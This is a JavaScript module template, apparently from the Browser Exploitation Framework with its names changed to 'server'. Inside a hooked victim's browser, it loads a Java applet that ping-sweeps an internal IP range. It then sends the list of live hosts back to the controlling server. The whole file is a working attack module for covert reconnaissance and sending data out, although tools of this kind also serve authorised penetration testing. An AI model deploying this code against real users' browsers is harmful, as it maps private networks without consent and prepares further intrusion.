//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//


server.execute(function() {

    var ipRange = "<%= @ipRange %>";
    var timeout = "<%= @timeout %>";
    var appletTimeout = 30;
    var output = "";
    var hostNumber = 0;
    var internal_counter = 0;
    var firstMsgSent = false;

    server.dom.attachApplet('pingSweep', 'pingSweep', 'pingSweep', server.net.httpproto+"://"+server.net.host+":"+server.net.port+"/", null, [{'ipRange':ipRange, 'timeout':timeout}]);

		function waituntilok() {
			try {
			    hostNumber = document.pingSweep.getHostsNumber();
                if(hostNumber != null && hostNumber > 0){
                    if(!firstMsgSent){
                        server.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Applet attached.<br>Hosts to check: ' + hostNumber + '<br>Required time (s): ~' + (timeout * hostNumber)/1000);
                        firstMsgSent = true;
                    }
                    output = document.pingSweep.getAliveHosts();
                    clearTimeout(int_timeout);
                    clearTimeout(ext_timeout);
				    server.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Alive hosts:<br>'+output.replace(/\n/g,"<br>"), server.are.status_success());
				    server.dom.detachApplet('pingSweep');
				    return;
                }else{
                     server.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=No hosts to check', server.are.status_error());
                     return;
                }
			} catch (e) {
				internal_counter++;
				if (internal_counter > appletTimeout) {
					server.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Timeout after '+appletTimeout+' seconds');
					server.dom.detachApplet('pingSweep');
					return;
				}
				int_timeout = setTimeout(function() {waituntilok()},1000);
			}
		}

		ext_timeout = setTimeout(function() {waituntilok()},5000);

});

